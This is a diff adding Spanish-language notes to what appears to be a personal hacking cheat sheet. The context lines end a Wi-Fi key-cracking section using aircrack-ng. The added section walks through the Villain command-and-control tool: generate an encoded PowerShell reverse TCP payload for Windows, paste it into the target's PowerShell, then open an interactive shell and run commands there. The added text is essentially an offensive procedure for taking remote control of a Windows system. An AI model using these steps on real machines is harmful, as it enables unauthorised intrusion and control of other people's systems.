@@ -191,6 +191,31 @@ tshark -i wlan0 -w capture.cap
 --- aircrack-ng <new-02.cap> -w <word.txt>
 --- Copiar la llave encontrada
 
+++ Villain Tool
+--- URL: https://github.com/t3l3machus/Villain
+--- Navegar al directorio del programa
+--- Instalar las dependencias: pip3 install -r requirements.txt
+--- python3 Villain.py
+--- help generate
+--- generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode (Permite generar un payload para Windows)
+--- Copiar el comando de powershell generado
+--- Pegar dicho comando en powershell 
+--- Ejecutar en la terminal: sessions 
+--- shell <session_ID>
+--- Se mostrará el mensaje: Interactive pseudo-shell activated
+--- En estos momentos ya tenemos control del sistema Windows y podemos ejecutar comandos
+--- Comandos tales como: 
+dir (Ver directorios)
+mkdir <nombre directorio>  (Crear directorio)
+rmdir <nombre directorio> (Borrar directorio)
+
+
+
+
+
+
+
+
 
 
 
